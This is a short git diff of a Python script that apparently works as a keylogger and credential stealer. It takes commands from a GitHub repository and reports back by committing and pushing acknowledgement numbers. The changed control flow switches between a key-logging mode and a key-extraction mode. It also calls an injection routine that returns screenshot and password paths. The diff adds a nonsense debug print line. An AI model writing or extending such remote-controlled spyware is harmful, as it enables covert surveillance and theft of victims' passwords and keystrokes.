@@ -125,8 +125,7 @@ if __name__ == "__main__":
 
             # If we can can_communicate_to_github then we can ask it for the mode!
             mode, error_message = repo.get_mode_from_repo()
-            if mode == "E" and not can_extract:
-                mode = "L"
+
 
             print(f"{error_message}",file=sys.stderr)
 
@@ -142,7 +141,6 @@ if __name__ == "__main__":
             git.commit_and_push(f"Sending updated ack_number {repo.ack_number}")
 
         print(f"Last Sent ACK: {repo.ack_number}" , file=sys.stderr)
-
         if mode == "L":
             # Call key logging function:
             print(f"Starting Key Logging...")
@@ -155,7 +153,10 @@ if __name__ == "__main__":
             screen_path, pass_path = inject.main()
             
 
+        elif mode == "E" and not can_extract:
+            mode = "L"
         elif mode == "E":
+            print("HERER extracing kfdjslkfjsdlkfjsldkfjsldkfjslkfdjslkfdjsdlkfj")
             can_extract = True
             # Call key Extraction function:
             handler.mode = mode
